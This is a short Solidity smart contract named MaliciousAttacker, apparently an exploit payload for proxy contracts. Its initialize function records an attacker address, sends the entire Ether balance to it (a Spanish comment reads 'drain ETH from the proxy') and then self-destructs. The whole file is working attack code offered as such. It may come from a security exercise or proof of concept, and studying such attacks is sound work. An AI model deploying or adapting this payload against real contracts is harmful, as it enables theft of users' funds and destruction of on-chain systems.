// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

/**
 * @title MaliciousAttacker
 * @dev This contract is designed to self-destruct and send all its Ether to a specified address.
 */
contract MaliciousAttacker {
    address public attacker;

    function initialize(address _attacker) external {
        require(attacker == address(0), "Already initialized");
        attacker = _attacker;

        // 1) drenar ETH del proxy
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "drain failed");

        // autodestrucción del contrato
        selfdestruct(payable(attacker));
    }

    fallback() external payable {}

    receive() external payable {}
}
